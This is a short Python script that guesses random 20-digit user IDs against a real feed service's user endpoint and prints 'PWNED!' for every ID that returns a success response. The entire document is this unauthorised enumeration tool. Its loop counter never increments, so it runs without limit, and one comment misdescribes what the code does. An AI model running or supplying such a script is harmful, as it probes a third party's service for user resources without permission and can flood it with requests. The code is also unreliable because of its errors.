# importing the requests library 
import requests 
from random import randint
  
# api-endpoint 
URL = "http://feeds.feedburner.com/~u/"
x = 0
while x < 1000:
	# sending get request and saving the response as response object
	uid = str(randint(10000000000000000000, 99999999999999999999)) 
	newUrl = URL+uid
	r = requests.get(url = newUrl) 
	# extracting data in json format 
	data = r.status_code
	if (data==200):
		print("PWNED! " + uid)
	elif(data!=502 and data!=404):
		print("error!"+str(data))